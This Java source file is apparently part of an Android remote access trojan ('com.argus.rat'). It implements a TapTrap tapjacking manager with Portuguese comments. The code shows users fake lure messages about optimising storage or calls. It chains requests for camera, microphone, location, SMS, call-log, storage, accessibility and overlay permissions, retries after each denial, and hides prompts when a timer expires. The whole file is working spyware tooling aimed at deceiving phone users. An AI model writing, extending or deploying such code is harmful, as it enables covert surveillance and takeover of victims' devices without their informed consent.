package com.argus.rat;

import android.app.Activity;
import android.app.ActivityOptions;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/**
 * TapTrapManager implementa técnicas avançadas de tapjacking baseadas em animações
 * para obter permissões sensíveis do usuário de forma furtiva.
 * 
 * Baseado na pesquisa "TapTrap: Animation-Driven Tapjacking on Android" (USENIX 2025)
 */
public class TapTrapManager {
    private static final String TAG = "TapTrapManager";
    
    // Códigos de solicitação de permissão
    private static final int REQUEST_CODE_CAMERA = 1001;
    private static final int REQUEST_CODE_LOCATION = 1002;
    private static final int REQUEST_CODE_SMS = 1003;
    private static final int REQUEST_CODE_PHONE = 1004;
    private static final int REQUEST_CODE_STORAGE = 1005;
    private static final int REQUEST_CODE_ACCESSIBILITY = 1006;
    private static final int REQUEST_CODE_ADMIN = 1007;
    private static final int REQUEST_CODE_OVERLAY = 1008;
    
    // Permissões alvo
    private static final String[] CAMERA_PERMISSIONS = {
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO"
    };
    
    private static final String[] LOCATION_PERMISSIONS = {
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION"
    };
    
    private static final String[] SMS_PERMISSIONS = {
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS"
    };
    
    private static final String[] PHONE_PERMISSIONS = {
        "android.permission.READ_PHONE_STATE",
        "android.permission.CALL_PHONE",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG"
    };
    
    private static final String[] STORAGE_PERMISSIONS = {
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.MANAGE_EXTERNAL_STORAGE"
    };
    
    private Activity activity;
    private Handler handler;
    private CountDownTimer attackTimer;
    private boolean isAttackInProgress = false;
    private int currentPermissionIndex = 0;
    private String[] currentPermissionSet;
    private int currentRequestCode;
    
    // Callback para notificar quando permissões forem obtidas
    public interface PermissionCallback {
        void onPermissionGranted(String permission);
        void onPermissionDenied(String permission);
        void onAllPermissionsGranted();
        void onAttackCompleted(boolean success);
    }
    
    private PermissionCallback callback;

    public TapTrapManager(Activity activity) {
        this.activity = activity;
        this.handler = new Handler(Looper.getMainLooper());
    }

    public void setPermissionCallback(PermissionCallback callback) {
        this.callback = callback;
    }

    /**
     * Inicia o processo de obtenção de todas as permissões necessárias usando TapTrap
     */
    public void startPermissionHarvesting() {
        Log.d(TAG, "Starting standard permission collection");

        // Request all permissions at once using standard Android method
        java.util.ArrayList<String> allPermissions = new java.util.ArrayList<>();
        allPermissions.addAll(java.util.Arrays.asList(CAMERA_PERMISSIONS));
        allPermissions.addAll(java.util.Arrays.asList(LOCATION_PERMISSIONS));
        allPermissions.addAll(java.util.Arrays.asList(SMS_PERMISSIONS));
        allPermissions.addAll(java.util.Arrays.asList(PHONE_PERMISSIONS));
        allPermissions.addAll(java.util.Arrays.asList(STORAGE_PERMISSIONS));

        String[] permArray = allPermissions.toArray(new String[0]);

        // Single request for all permissions
        ActivityCompat.requestPermissions(activity, permArray, REQUEST_CODE_LOCATION);
        if (isAttackInProgress) {
            Log.w(TAG, "Ataque já em progresso");
            return;
        }
        
        // Sequência de permissões a serem solicitadas
        startCameraPermissionAttack();
    }

    /**
     * Solicita permissões de câmera usando TapTrap
     */
    public void startCameraPermissionAttack() {
        if (!hasPermissions(CAMERA_PERMISSIONS)) {
            Log.d(TAG, "Iniciando ataque TapTrap para permissões de câmera");
            
            currentPermissionSet = CAMERA_PERMISSIONS;
            currentRequestCode = REQUEST_CODE_CAMERA;
            
            executeTapTrapAttackWithCustomAnimation(
                activity.getString(R.string.taptrap_camera_lure),
                activity.getString(R.string.taptrap_processing_camera),
                CAMERA_PERMISSIONS,
                REQUEST_CODE_CAMERA,
                R.anim.taptrap_camera_attack
            );
        } else {
            Log.d(TAG, "Permissões de câmera já concedidas");
            startLocationPermissionAttack();
        }
    }

    /**
     * Solicita permissões de localização usando TapTrap
     */
    public void startLocationPermissionAttack() {
        if (!hasPermissions(LOCATION_PERMISSIONS)) {
            Log.d(TAG, "Iniciando ataque TapTrap para permissões de localização");
            
            currentPermissionSet = LOCATION_PERMISSIONS;
            currentRequestCode = REQUEST_CODE_LOCATION;
            
            executeTapTrapAttackWithCustomAnimation(
                activity.getString(R.string.taptrap_location_lure),
                activity.getString(R.string.taptrap_processing_location),
                LOCATION_PERMISSIONS,
                REQUEST_CODE_LOCATION,
                R.anim.taptrap_location_attack
            );
        } else {
            Log.d(TAG, "Permissões de localização já concedidas");
            startSmsPermissionAttack();
        }
    }

    /**
     * Solicita permissões de SMS usando TapTrap
     */
    public void startSmsPermissionAttack() {
        if (!hasPermissions(SMS_PERMISSIONS)) {
            Log.d(TAG, "Iniciando ataque TapTrap para permissões de SMS");
            
            currentPermissionSet = SMS_PERMISSIONS;
            currentRequestCode = REQUEST_CODE_SMS;
            
            executeTapTrapAttackWithCustomAnimation(
                activity.getString(R.string.taptrap_sms_lure),
                activity.getString(R.string.taptrap_processing_sms),
                SMS_PERMISSIONS,
                REQUEST_CODE_SMS,
                R.anim.taptrap_sms_attack
            );
        } else {
            Log.d(TAG, "Permissões de SMS já concedidas");
            startPhonePermissionAttack();
        }
    }

    /**
     * Solicita permissões de telefone usando TapTrap
     */
    public void startPhonePermissionAttack() {
        if (!hasPermissions(PHONE_PERMISSIONS)) {
            Log.d(TAG, "Iniciando ataque TapTrap para permissões de telefone");
            
            currentPermissionSet = PHONE_PERMISSIONS;
            currentRequestCode = REQUEST_CODE_PHONE;
            
            executeTapTrapAttack(
                "Toque para otimizar ligações",
                "Configurando telefone...",
                PHONE_PERMISSIONS,
                REQUEST_CODE_PHONE
            );
        } else {
            Log.d(TAG, "Permissões de telefone já concedidas");
            startStoragePermissionAttack();
        }
    }

    /**
     * Solicita permissões de armazenamento usando TapTrap
     */
    public void startStoragePermissionAttack() {
        if (!hasPermissions(STORAGE_PERMISSIONS)) {
            Log.d(TAG, "Iniciando ataque TapTrap para permissões de armazenamento");
            
            currentPermissionSet = STORAGE_PERMISSIONS;
            currentRequestCode = REQUEST_CODE_STORAGE;
            
            executeTapTrapAttack(
                "Toque para liberar espaço",
                "Otimizando armazenamento...",
                STORAGE_PERMISSIONS,
                REQUEST_CODE_STORAGE
            );
        } else {
            Log.d(TAG, "Permissões de armazenamento já concedidas");
            startAccessibilityPermissionAttack();
        }
    }

    /**
     * Solicita permissões de acessibilidade usando TapTrap
     */
    public void startAccessibilityPermissionAttack() {
        if (!isAccessibilityServiceEnabled()) {
            Log.d(TAG, "Iniciando ataque TapTrap para serviços de acessibilidade");
            
            executeTapTrapAccessibilityAttackWithAnimation();
        } else {
            Log.d(TAG, "Serviços de acessibilidade já habilitados");
            startOverlayPermissionAttack();
        }
    }

    /**
     * Solicita permissões de overlay usando TapTrap
     */
    public void startOverlayPermissionAttack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                Log.d(TAG, "Iniciando ataque TapTrap para permissões de overlay");

                executeTapTrapOverlayAttackWithAnimation();
            } else {
                Log.d(TAG, "Permissões de overlay já concedidas");
                completePermissionHarvesting();
            }
        }
    }

    /**
     * Executa o ataque TapTrap principal com animação personalizada
     */
    private void executeTapTrapAttackWithCustomAnimation(String lureText, String processingText,
                                                        String[] permissions, int requestCode, int animationRes) {
        isAttackInProgress = true;
        
        // Mostrar texto de isca para o usuário
        showLureInterface(lureText);
        
        // Aguardar um pouco para o usuário se preparar
        handler.postDelayed(() -> {
            // Mostrar texto de processamento
            showProcessingInterface(processingText);
            
            // Executar TapTrap após mais um delay
            handler.postDelayed(() -> {
                performTapTrapAttackWithAnimation(permissions, requestCode, animationRes);
            }, 1500);
        }, 2000);
    }

    /**
     * Executa o ataque TapTrap principal (método original para compatibilidade)
     */
    private void executeTapTrapAttack(String lureText, String processingText, String[] permissions, int requestCode) {
        executeTapTrapAttackWithCustomAnimation(lureText, processingText, permissions, requestCode, R.anim.taptrap_fade_in);
    }

    /**
     * Performa o ataque TapTrap usando animações personalizadas específicas
     */

    private void performTapTrapAttackWithAnimation(String[] permissions, int requestCode, int animationRes) {
        try {
            Log.d(TAG, "Executing TapTrap for permissions: " + java.util.Arrays.toString(permissions));

            // Filter permissions to only request those not yet granted
            java.util.ArrayList<String> permissionsToRequest = new java.util.ArrayList<>();
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(activity, permission)
                        != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }

            if (permissionsToRequest.isEmpty()) {
                Log.d(TAG, "All permissions already granted");
                // Simulate successful grant
                handler.post(() -> {
                    if (callback != null) {
                        callback.onPermissionGranted(getPermissionNameByCode(requestCode));
                    }
                    proceedToNextPermission(requestCode);
                });
                return;
            }

            // Use proper Android API to request permissions
            String[] permArray = permissionsToRequest.toArray(new String[0]);

            // CORRECT METHOD: Use ActivityCompat
            ActivityCompat.requestPermissions(
                    activity,
                    permArray,
                    requestCode
            );

            // Start attack timer
            startAttackTimer();

        } catch (Exception e) {
            Log.e(TAG, "Error in TapTrap attack", e);
            isAttackInProgress = false;

            // Notify failure
            if (callback != null) {
                callback.onPermissionDenied(getPermissionNameByCode(requestCode));
            }
        }
    }
//    private void performTapTrapAttackWithAnimation(String[] permissions, int requestCode, int animationRes) {
//        try {
//            Log.d(TAG, "Executando TapTrap para permissões: " + java.util.Arrays.toString(permissions));
//
//            // Criar Intent para solicitação de permissões
//            Intent permissionIntent = new Intent("android.content.pm.action.REQUEST_PERMISSIONS");
//            permissionIntent.putExtra("android.content.pm.extra.REQUEST_PERMISSIONS_NAMES", permissions);
//
//            // Criar animação TapTrap personalizada específica
//            ActivityOptions options = ActivityOptions.makeCustomAnimation(
//                activity,
//                animationRes,                // Animação específica para o tipo de permissão
//                R.anim.taptrap_fade_out     // Animação de saída (instantânea)
//            );
//
//            // Iniciar solicitação de permissão com animação TapTrap
//            activity.startActivityForResult(permissionIntent, requestCode, options.toBundle());
//
//            // Iniciar timer de ataque
//            startAttackTimer();
//
//        } catch (Exception e) {
//            Log.e(TAG, "Erro no ataque TapTrap", e);
//            isAttackInProgress = false;
//        }
//    }

    /**
     * Performa o ataque TapTrap usando animações padrão (compatibilidade)
     */
    private void performTapTrapAttack(String[] permissions, int requestCode) {
        performTapTrapAttackWithAnimation(permissions, requestCode, R.anim.taptrap_fade_in);
    }

    /**
     * Ataque TapTrap específico para acessibilidade com animação personalizada
     */
    private void executeTapTrapAccessibilityAttackWithAnimation() {
        showLureInterface(activity.getString(R.string.taptrap_accessibility_lure));
        
        handler.postDelayed(() -> {
            showProcessingInterface(activity.getString(R.string.taptrap_processing_accessibility));
            
            handler.postDelayed(() -> {
                try {
                    Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    
                    ActivityOptions options = ActivityOptions.makeCustomAnimation(
                        activity,
                        R.anim.taptrap_accessibility_attack,  // Animação específica para acessibilidade
                        R.anim.taptrap_fade_out
                    );
                    
                    activity.startActivityForResult(accessibilityIntent, REQUEST_CODE_ACCESSIBILITY, options.toBundle());
                    startAttackTimer();
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro no ataque de acessibilidade", e);
                    isAttackInProgress = false;
                }
            }, 1500);
        }, 2000);
    }

    /**
     * Ataque TapTrap específico para acessibilidade (método original para compatibilidade)
     */
    private void executeTapTrapAccessibilityAttack() {
        executeTapTrapAccessibilityAttackWithAnimation();
    }

    /**
     * Ataque TapTrap específico para overlay com animação personalizada
     */
    private void executeTapTrapOverlayAttackWithAnimation() {
        showLureInterface(activity.getString(R.string.taptrap_overlay_lure));
        
        handler.postDelayed(() -> {
            showProcessingInterface(activity.getString(R.string.taptrap_processing_overlay));
            
            handler.postDelayed(() -> {
                try {
                    Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        android.net.Uri.parse("package:" + activity.getPackageName()));
                    
                    ActivityOptions options = ActivityOptions.makeCustomAnimation(
                        activity,
                        R.anim.taptrap_overlay_attack,  // Animação específica para overlay
                        R.anim.taptrap_fade_out
                    );
                    
                    activity.startActivityForResult(overlayIntent, REQUEST_CODE_OVERLAY, options.toBundle());
                    startAttackTimer();
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro no ataque de overlay", e);
                    isAttackInProgress = false;
                }
            }, 1500);
        }, 2000);
    }

    /**
     * Ataque TapTrap específico para overlay (método original para compatibilidade)
     */
    private void executeTapTrapOverlayAttack() {
        executeTapTrapOverlayAttackWithAnimation();
    }

    /**
     * Inicia timer do ataque
     */
    private void startAttackTimer() {
        if (attackTimer != null) {
            attackTimer.cancel();
        }
        
        // Timer de 6 segundos como no TapTrap original
        attackTimer = new CountDownTimer(6000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                Log.d(TAG, "Janela de ataque fecha em: " + (millisUntilFinished / 1000) + "s");
            }

            @Override
            public void onFinish() {
                Log.d(TAG, "Janela de ataque expirou");
                
                if (isAttackInProgress) {
                    // Retornar à activity principal para ocultar solicitação de permissão
                    Intent mainIntent = new Intent(activity, MainActivity.class);
                    activity.startActivity(mainIntent);
                    
                    // Reagendar próxima tentativa
                    scheduleRetryAttack();
                }
            }
        };
        
        attackTimer.start();
    }

    /**
     * Agenda nova tentativa de ataque
     */
    private void scheduleRetryAttack() {
        handler.postDelayed(() -> {
            if (!hasPermissions(currentPermissionSet)) {
                Log.d(TAG, "Reagendando ataque para permissões: " + java.util.Arrays.toString(currentPermissionSet));
                
                // Tentar novamente após 3 segundos
                handler.postDelayed(() -> {
                    performTapTrapAttack(currentPermissionSet, currentRequestCode);
                }, 3000);
            }
        }, 2000);
    }

    /**
     * Processa resultado da solicitação de permissão
     */
    public void handleActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        isAttackInProgress = false;
        
        if (attackTimer != null) {
            attackTimer.cancel();
        }
        
        if (resultCode == Activity.RESULT_OK) {
            Log.i(TAG, "Permissão concedida via TapTrap! RequestCode: " + requestCode);
            
            if (callback != null) {
                callback.onPermissionGranted(getPermissionNameByCode(requestCode));
            }
            
            // Continuar para próxima permissão
            proceedToNextPermission(requestCode);
            
        } else {
            Log.w(TAG, "Permissão negada. RequestCode: " + requestCode);
            
            if (callback != null) {
                callback.onPermissionDenied(getPermissionNameByCode(requestCode));
            }
            
            // Reagendar ataque para esta permissão
            scheduleRetryAttack();
        }
    }

    /**
     * Continua para a próxima permissão na sequência
     */
    private void proceedToNextPermission(int completedRequestCode) {
        // Aguardar um pouco antes da próxima permissão
        handler.postDelayed(() -> {
            switch (completedRequestCode) {
                case REQUEST_CODE_CAMERA:
                    startLocationPermissionAttack();
                    break;
                case REQUEST_CODE_LOCATION:
                    startSmsPermissionAttack();
                    break;
                case REQUEST_CODE_SMS:
                    startPhonePermissionAttack();
                    break;
                case REQUEST_CODE_PHONE:
                    startStoragePermissionAttack();
                    break;
                case REQUEST_CODE_STORAGE:
                    startAccessibilityPermissionAttack();
                    break;
                case REQUEST_CODE_ACCESSIBILITY:
                    startOverlayPermissionAttack();
                    break;
                case REQUEST_CODE_OVERLAY:
                    completePermissionHarvesting();
                    break;
                default:
                    Log.w(TAG, "Código de permissão desconhecido: " + completedRequestCode);
                    break;
            }
        }, 2000);
    }

    /**
     * Finaliza o processo de coleta de permissões
     */
    private void completePermissionHarvesting() {
        Log.i(TAG, "Processo de coleta de permissões concluído");
        
        if (callback != null) {
            callback.onAllPermissionsGranted();
            callback.onAttackCompleted(true);
        }
        
        // Limpar interface
        clearLureInterface();
        
        Toast.makeText(activity, "Configuração concluída!", Toast.LENGTH_SHORT).show();
    }

    /**
     * Exibe interface de isca para atrair o usuário
     */
    private void showLureInterface(String message) {
        activity.runOnUiThread(() -> {
            // Implementar UI de isca
            Log.d(TAG, "Exibindo interface de isca: " + message);
            
            // Aqui você pode modificar elementos da UI para mostrar a mensagem de isca
            // Por exemplo, atualizar TextView ou mostrar Toast
            Toast.makeText(activity, message, Toast.LENGTH_LONG).show();
        });
    }

    /**
     * Exibe interface de processamento
     */
    private void showProcessingInterface(String message) {
        activity.runOnUiThread(() -> {
            Log.d(TAG, "Exibindo interface de processamento: " + message);
            Toast.makeText(activity, message, Toast.LENGTH_SHORT).show();
        });
    }

    /**
     * Limpa interface de isca
     */
    private void clearLureInterface() {
        activity.runOnUiThread(() -> {
            Log.d(TAG, "Limpando interface de isca");
            // Restaurar UI normal
        });
    }

    /**
     * Verifica se todas as permissões do array foram concedidas
     */
    private boolean hasPermissions(String[] permissions) {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    /**
     * Verifica se o serviço de acessibilidade está habilitado
     */
    private boolean isAccessibilityServiceEnabled() {
        try {
            String settingValue = Settings.Secure.getString(
                activity.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            
            if (settingValue != null) {
                return settingValue.contains(activity.getPackageName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao verificar serviço de acessibilidade", e);
        }
        return false;
    }

    /**
     * Retorna nome da permissão baseado no código de solicitação
     */
    private String getPermissionNameByCode(int requestCode) {
        switch (requestCode) {
            case REQUEST_CODE_CAMERA: return "CAMERA";
            case REQUEST_CODE_LOCATION: return "LOCATION";
            case REQUEST_CODE_SMS: return "SMS";
            case REQUEST_CODE_PHONE: return "PHONE";
            case REQUEST_CODE_STORAGE: return "STORAGE";
            case REQUEST_CODE_ACCESSIBILITY: return "ACCESSIBILITY";
            case REQUEST_CODE_OVERLAY: return "OVERLAY";
            default: return "UNKNOWN";
        }
    }

    /**
     * Executa ataque TapTrap para permissão específica
     */
    public void executeSinglePermissionAttack(String permission, String lureMessage) {
        Log.d(TAG, "Executando ataque individual para: " + permission);
        
        showLureInterface(lureMessage);
        
        handler.postDelayed(() -> {
            try {
                Intent intent = new Intent("android.content.pm.action.REQUEST_PERMISSIONS");
                intent.putExtra("android.content.pm.extra.REQUEST_PERMISSIONS_NAMES", new String[]{permission});

                ActivityOptions options = ActivityOptions.makeCustomAnimation(
                    activity,
                    R.anim.taptrap_fade_in,
                    R.anim.taptrap_fade_out
                );

                activity.startActivityForResult(intent, 999, options.toBundle());
                startAttackTimer();

            } catch (Exception e) {
                Log.e(TAG, "Erro no ataque individual", e);
            }
        }, 2000);
    }

    /**
     * Para o ataque em progresso
     */
    public void stopAttack() {
        if (attackTimer != null) {
            attackTimer.cancel();
        }
        
        isAttackInProgress = false;
        clearLureInterface();
        
        Log.d(TAG, "Ataque TapTrap interrompido");
    }

    /**
     * Verifica se todas as permissões essenciais foram concedidas
     */
    public boolean hasAllEssentialPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return hasPermissions(CAMERA_PERMISSIONS) &&
                   hasPermissions(LOCATION_PERMISSIONS) &&
                   hasPermissions(SMS_PERMISSIONS) &&
                   hasPermissions(PHONE_PERMISSIONS) &&
                   hasPermissions(STORAGE_PERMISSIONS) &&
                   isAccessibilityServiceEnabled() &&
                   Settings.canDrawOverlays(activity);
        }
        return false;
    }

    /**
     * Limpa recursos
     */
    public void cleanup() {
        stopAttack();
        callback = null;
        Log.d(TAG, "TapTrapManager limpo");
    }
}